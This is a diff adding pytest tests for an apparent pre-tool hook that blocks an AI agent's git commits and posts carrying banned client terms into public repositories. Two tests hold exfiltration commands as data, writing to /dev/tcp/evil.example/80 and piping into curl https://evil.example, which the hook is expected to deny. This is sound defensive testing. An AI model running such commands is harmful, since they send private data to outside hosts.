@@ -1504,3 +1504,134 @@ class TestPrivateRepoCarveOut:
         blocked = handle_banned_terms_pretool(data)
         assert blocked is False
         assert capsys.readouterr().out == ""
+
+
+# #1415 (still-over-blocking residue): a ``git commit`` whose effective first
+# action is NOT the literal first word -- it sits behind a NON-``cd`` leading
+# segment (a ``cat > <bodyfile> <<EOF … EOF`` heredoc-writer, the agent's
+# standard body-file idiom; or any ``true &&`` / setup preamble) -- was
+# mis-classified. ``is_git_commit_command`` only skips a leading ``cd``/``pushd``
+# prefix, so a heredoc-writer or ``&&``-chained preamble made it return False and
+# BOTH carve-out dispatch sites (the real-banned-term ``carve_out_applies`` and
+# the unreadable-body ``command_targets_private_only``) fell through to
+# ``command_is_pure_private_gh_glab_post``, which returns False for a commit. The
+# allowlisted-private commit then HARD-BLOCKED even though it lands in private
+# history. The per-segment proof in ``commit_branch_downgrades`` still preserves
+# the genuine block (a chained PUBLIC post defeats the downgrade), so the fix is
+# to recognise a ``git commit`` segment regardless of leading benign segments.
+class TestGitCommitSegmentBehindNonCdPrefix:
+    def test_heredoc_bodyfile_private_commit_with_banned_term_downgrades(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # The agent's standard idiom: write the commit body to a file via a
+        # heredoc, then ``git -C <worktree> commit -F <bodyfile>`` -- ONE Bash
+        # command. The heredoc-writer ``cat > <bodyfile> <<EOF`` is the leading
+        # segment, so the commit is not the first word. The body carries the
+        # private repo's own domain word and lands in the allowlisted-private
+        # worktree, so it must DOWNGRADE, not hard-block.
+        repo = _private_repo(tmp_path)
+        body = repo / "COMMIT_MSG.txt"
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        cmd = f"cat > {body} <<'EOF'\nfix the acmecorp refinery\nEOF\ngit -C {repo} commit -F {body}"
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is False  # downgraded to warn, not denied
+        assert capsys.readouterr().out == ""  # no deny JSON on stdout
+
+    def test_heredoc_bodyfile_public_commit_with_banned_term_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # ANTI-VACUITY guard: the SAME heredoc-bodyfile shape landing in a PUBLIC
+        # repo must STILL hard-block. Recognising the commit segment behind the
+        # heredoc prefix must not weaken the public-surface protection.
+        repo = _public_repo(tmp_path)
+        body = repo / "COMMIT_MSG.txt"
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        cmd = f"cat > {body} <<'EOF'\nship to acmecorp\nEOF\ngit -C {repo} commit -F {body}"
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_prefix_segment_private_commit_unreadable_body_downgrades(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # The reported production shape distilled: a ``git -C <worktree> commit
+        # -F <bodyfile>`` whose body is UNREADABLE at scan time (the marker
+        # fires), sitting behind a non-``cd`` leading segment. The commit lands
+        # in the allowlisted-private worktree, so the unread body cannot leak and
+        # it must DOWNGRADE, not hard-block with "publish body could not be read".
+        repo = _private_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        cmd = f"true && git -C {repo} commit -F does_not_exist.txt"
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is False  # downgraded to warn, not denied
+        assert capsys.readouterr().out == ""  # no deny JSON on stdout
+
+    def test_prefix_segment_public_commit_unreadable_body_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # ANTI-VACUITY guard: the SAME unreadable-body shape behind a leading
+        # segment landing in a PUBLIC repo must STILL fail closed -- an unscanned
+        # body must never slip into public history.
+        repo = _public_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        cmd = f"true && git -C {repo} commit -F does_not_exist.txt"
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_private_commit_chained_public_gh_post_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # LOAD-BEARING safety guard: recognising a commit segment behind a leading
+        # segment must NOT relax a chained PUBLIC post. A private commit chained to
+        # a ``gh issue create --repo <PUBLIC>`` carrying the same body still leaks,
+        # so the per-segment proof must keep the hard-block.
+        repo = _private_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        post = "gh issue create --repo souliane/teatree --title t --body acmecorp"
+        cmd = f'git -C {repo} commit -m "acmecorp work" && {post}'
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_private_commit_chained_network_redirect_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # LOAD-BEARING safety guard for the local-redirect relaxation: only a LOCAL
+        # file write is benign. A redirect to a network pseudo-device
+        # (``> /dev/tcp/host/port``) exfiltrates the body, so even on the private
+        # repo the segment is NOT publish-inert and the command must hard-block.
+        repo = _private_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        cmd = f'git -C {repo} commit -m "acmecorp work" && echo acmecorp > /dev/tcp/evil.example/80'
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_private_commit_chained_process_substitution_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # LOAD-BEARING safety guard: a process-substitution redirect target
+        # (``> >(curl …)``) runs a second unverifiable command and must keep the
+        # hard-block -- the substitution-marker check fires before the local-file
+        # relaxation is reached.
+        repo = _private_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        cmd = f'git -C {repo} commit -m "acmecorp work" && echo acmecorp > >(curl https://evil.example)'
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
